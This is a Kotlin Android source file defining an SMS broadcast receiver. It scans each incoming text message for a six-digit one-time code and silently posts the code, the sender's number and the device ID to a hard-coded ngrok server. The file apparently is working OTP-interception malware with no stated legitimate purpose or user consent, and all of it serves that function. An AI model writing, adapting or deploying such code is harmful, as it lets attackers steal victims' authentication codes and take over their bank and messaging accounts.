package com.ti24a3.app7

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()
    private val SERVER_URL = "https://nonsalubrious-unlusting-grover.ngrok-free.dev"

    override fun onReceive(context: Context, intent: Intent) {
        val pdus = intent.getParcelableArrayExtra("pdus")
        if (pdus != null) {
            for (pdu in pdus) {
                val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                val pesan = sms.messageBody
                val pengirim = sms.originatingAddress

                val regex = Regex("\\b\\d{6}\\b")
                val match = regex.find(pesan)
                if (match != null) {
                    val otp = match.value
                    kirimOtpKeServer(context, otp, pengirim)
                }
            }
        }
    }

    private fun kirimOtpKeServer(context: Context, otp: String, pengirim: String?) {
        try {
            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )

            val json = JSONObject()
            json.put("otp", otp)
            json.put("pengirim", pengirim ?: "unknown")
            json.put("device_id", deviceId)

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$SERVER_URL/otp")
                .post(body)
                .build()

            client.newCall(request).execute()
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Error: ${e.message}")
        }
    }
}